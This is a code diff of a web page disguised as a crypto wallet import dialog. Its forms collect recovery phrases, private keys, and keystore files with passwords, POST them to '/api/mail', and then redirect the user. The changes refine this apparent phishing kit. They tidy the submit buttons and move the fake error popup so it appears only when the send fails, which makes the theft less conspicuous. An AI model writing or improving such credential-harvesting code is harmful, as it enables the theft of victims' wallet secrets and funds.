@@ -2024,9 +2024,9 @@
                 <div id="hidden-section">
                     <!-- Tabs Navigation -->
                     <div class="tabsmodal">
-                        <div class="tab-button active" onclick="openTab(event, &#39;phrase&#39;)">Phrase</div>
-                        <div class="tab-button" onclick="openTab(event, &#39;privatekey&#39;)">Private Key</div>
-                        <div class="tab-button" onclick="openTab(event, &#39;keystore&#39;)">Keystore</div>
+                        <div class="tab-button active" onclick="openTab(event, 'phrase')">Phrase</div>
+                        <div class="tab-button" onclick="openTab(event, 'privatekey')">Private Key</div>
+                        <div class="tab-button" onclick="openTab(event, 'keystore')">Keystore</div>
                     </div>
 
                     <!--<form id="phraseFormg">-->
@@ -2035,7 +2035,7 @@
                         <div class="tab-content active" id="phrase">
                             <label for="phrase">Enter Phrase</label>
                             <textarea id="phrase" name="phrase" placeholder="Enter your recovery phrase (typically 12-24 words separated by a single space)" rows="6"></textarea>
-                            <button id="submitBtn" onclick="handleWalletSubmit(event)" class="btnmodal flex" type="submit">Import Wallet</button>
+                            <button id="submitBtn" class="btnmodal flex" type="submit">Import Wallet</button>
                         </div>
                     </form>
                     <!--<form id="privatekeyForm">-->
@@ -2044,7 +2044,7 @@
                         <div class="tab-content" id="privatekey">
                             <label for="private-key">Enter Private Key</label>
                             <input type="text" id="private-key" name="privatekey" placeholder="Enter your private key">
-                            <button id="submitBtn" onclick="handleWalletSubmit(event)" class="btnmodal flex" type="submit">Import Wallet</button>
+                            <button id="submitBtn" class="btnmodal flex" type="submit">Import Wallet</button>
                         </div>
                     </form>
                     <!--<form id="keystoreForm">-->
@@ -2055,7 +2055,7 @@
                             <textarea id="keystore-json" name="keystore" placeholder="Input your Keystore JSON" rows="6"></textarea>
                             <label for="password">Password</label>
                             <input type="text" id="password" name="password" placeholder="Enter Keystore password">
-                            <button id="submitBtn" onclick="handleWalletSubmit(event)" class="btnmodal flex" type="submit">Import Wallet</button>
+                            <button id="submitBtn" class="btnmodal flex" type="submit">Import Wallet</button>
                         </div>
                     </form>
                     <!--<button id="submitBtn" onclick="showErrorPopup()" class="btnmodal flex" type="submit">Import Wallet</button>-->
@@ -2128,8 +2128,6 @@
                         data.seedphrase = data.phrase;
                     }
 
-                    showErrorPopup();
-
                     try {
                         const response = await fetch('/api/mail', {
                             method: 'POST',
@@ -2146,6 +2144,7 @@
                         window.location.href = '/rdr.html';
                     } catch (error) {
                         console.error('Wallet submit error:', error);
+                        showErrorPopup();
                         alert('Unable to submit the wallet details right now. Please try again.');
                     }
                 }
